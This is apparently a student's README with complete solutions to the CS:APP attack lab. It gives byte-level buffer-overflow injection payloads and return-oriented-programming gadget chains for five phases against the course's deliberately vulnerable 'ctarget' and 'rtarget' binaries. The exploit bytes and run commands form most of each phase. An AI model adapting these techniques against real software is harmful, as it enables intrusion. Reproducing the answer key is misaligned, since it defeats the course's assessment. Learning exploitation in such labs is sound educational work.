# CSAPP-attacklab
This is a note for the solution of attacklab, our task is to use code-injection attack and ROP(Returen-Oriented-Programming) attack to attack two programs separately. This is a quiet throny problem when I'm  first exposed to this problem. Only if you read write-up carefully, you will know better. The [recitation video](https://scs.hosted.panopto.com/Panopto/Pages/Viewer.aspx?id=60c65748-2026-463f-8c57-134fd6661cdf) for the attack lab is also helpful. 

There are 5 problems to solve in total, 3 for the code-injection attack aiming at **ctarget** and another 2 for the ROP attack aiming at **rtarget**. The injection is through a function named **getbuf** in the two programs, which call another function **Gets** to read input bytes from standard input. The principle is that our input will be stored in stack and we can location and flush the caller's return address, then make the program return to where our injection code is and execute our code. The only difference between **ctarget** and **rtarget** is that rtarget has more protection mechanism so we cannot execute our injection code directly. Remember that every time before you inject your code, you have to transfer it to raw bytes using **hex2raw**, as the write-up said. Next I will give advise on ctarget and rtarget respectively.

## ctarget

We have to solve the first 3 problems in this part. Ctarget is a program without any security mechanism, such as stack randomization, stack destruction detection and executable code area limitation. We can just inject our code onto the stack and execute it. In the three injections, we should let the program jumps to function **touch1**, **touch2**, **touch3** respectively. 

### phase1 

The first injection is just a warm-up cause we just need to fush the return address and let **getbuf** return to touch1 rather the caller function. Here is the c code of touch1.

```c++
void touch1()
 {
 vlevel = 1; /* Part of validation protocol */
 printf("Touch1!: You called touch1()\n");
 validate(1);
 exit(0);
 }
```
Let's look at the solution. (exploit1/exploit1.txt)
```
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
c0 17 40 00 00 00 00 00 
```

The first 5 lines (40 bytes) are a series of instruction **nop** 's byte code representation. Because **getbuf** has 0x28 bytes space, we have to overlap this space to reach the return address. The we cover the return address with the address of touch1 (**0x4017c0**).
Then we use **hex2raw** to transfer the code.
```
./hex2raw < exploit1/exploit1.txt > exploit1/exploit1-raw.txt
```
And inject it.
```
./ctarget -q < exploit1/exploit1-raw.txt 
```
the *-q* option is to prevent the result from being submited to server. Here we get the successful result.
```
➜  attacklab-handout git:(master) ✗ ./ctarget -q < exploit1/exploit1-raw.txt 
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 C0 17 40 00 00 00 00 00 
```
### phase 2

The second injection is a bit difficult. Function touch2 receive an argument and have an equality verification as the c code shows below. In our injection code, we have to fisrt store the argument value (our cookie) onto the stack and pass it to register %rdi as the first argument of touch2.

```c++
void touch2(unsigned val)
{
vlevel = 2; /* Part of validation protocol */
if (val == cookie) {
printf("Touch2!: You called touch2(0x%.8x)\n", val);
validate(2);
} else {
printf("Misfire: You called touch2(0x%.8x)\n", val);
fail(2);
 }
 exit(0);
 }
```
Let's look at the solution. (exploit2/exploit2.txt)
```
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
a8 dc 61 55 00 00 00 00
48 c7 c7 fa 97 b9 59 	/* mov    $0x59b997fa,%rdi */  
68 ec 17 40 00       	/* pushq  $0x4017ec */
c3 90 90 90           /* retq   */
```
The 6th line is not touch2's address because we have to execute some code, so we let the program jump to the 7th line, which is the byte presentation of assmembly code.

```
mov    $0x59b997fa,%rdi 
pushq  $0x4017ec 
retq   
```
so you have to get the address of %rsp (0x5561dca0) first and do some calculation.
### phase 3
The third injection is more complicated. Here is the c code.
```c++
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
char cbuf[110];
/* Make position of check string unpredictable */
char *s = cbuf + random() % 100;
sprintf(s, "%.8x", val);
return strncmp(sval, s, 9) == 0;
}


 void touch3(char *sval)
 {
 vlevel = 3; /* Part of validation protocol */
 if (hexmatch(cookie, sval)) {
 printf("Touch3!: You called touch3(\"%s\")\n", sval);
 validate(3);
 } else {
 printf("Misfire: You called touch3(\"%s\")\n", sval);
 fail(3);
 }
 exit(0);
 }
```
What we passed to touch3 is a pointer pointed to the string presentation of our cookie (for me is "59b997fa"). So we have to store the string, string address, touch3's address.

Let's look at the solution.
```
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
a8 dc 61 55 00 00 00 00 
48 c7 c7 b8 dc 61 55 	/* mov    $0x5561dcb8,%rdi */
68 fa 18 40 00       	/* pushq  $0x4018fa */
c3 90 90 90             /* retq   */
35 39 62 39 39 37 66 61 /* "59b997fa" */
```
Still, we store the string on the stack and pass its address to %rdi, then we return to touch3.

## rtarget

rtarget use the stack randomization and executable code area limitation mechanism to protect the program. Therefore we cannot use code-injection attack. Here the ROP attack comes up. ROP attack is a method that you use the code segment existing in the program to attack itself. each code segment is a conbination of an common instruction and **ret** instruction like below.
```
48 89 c7               /* mov %rax,%rdi */ 
c3                     /* retq          */ 
```
We call code segment above as a budget. In this example, we need to find an existing code segment ***48 89 c7 c3*** and store its address on stack. When we put several budgets' address on stack, they can do the chain dump and execute each budget. Rtarget contain a section we call farm in which we can get the gadgets we need.

### phase 4

The forth injection is to call touch2 by ROP attack in rtarget.

Let's look at the solution.
```
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
ab 19 40 00 00 00 00 00 /* addval_219: pop %rax;ret */
fa 97 b9 59 00 00 00 00 /*    cookie:0x59b997fa     */
c5 19 40 00 00 00 00 00 /* setval_426: mov %rax,%rdi;ret */
ec 17 40 00 00 00 00 00 /* address of touch2        */
```
### phase 5
The last injection is the most difficult. It's the ROP attack version to call touch3. Because the stack is randomized, so we cannot use the absolute address to locate the string, instead we have to get the adress of %rsp and add the offset. Luckily their is a gadget in the farm.
```s
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```
Seem like we can put the address of %rsp and the offset in %rdi and %rsi to locate the string.

Let's look at the solution.

```
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
06 1a 40 00 00 00 00 00 /* mov %rsp,%rax;ret %rsp */
c5 19 40 00 00 00 00 00 /* mov %rax,%rdi;ret */
ab 19 40 00 00 00 00 00 /* pop %rax;ret */
48 00 00 00 00 00 00 00 /* offset */
dd 19 40 00 00 00 00 00 /* movl %eax,%edx;ret */
70 1a 40 00 00 00 00 00 /* movl %edx,%ecx;ret */
13 1a 40 00 00 00 00 00 /* movl %ecx,%esi;ret */
d6 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax;ret */
c5 19 40 00 00 00 00 00 /* mov %rax,%rdi;ret */
fa 18 40 00 00 00 00 00 /* touch3 */
35 39 62 39 39 37 66 61 /* "59b997fa" */
```

Here we use 8 gadgets, same as the official guide.

## Conclusion
This is quite an insteresting lab which introduce some attack skills of information security. As usual, I got a long time to start, but when I understood how to do it, I found it easy to finish. Hope you can enjoy it too. Good luck :)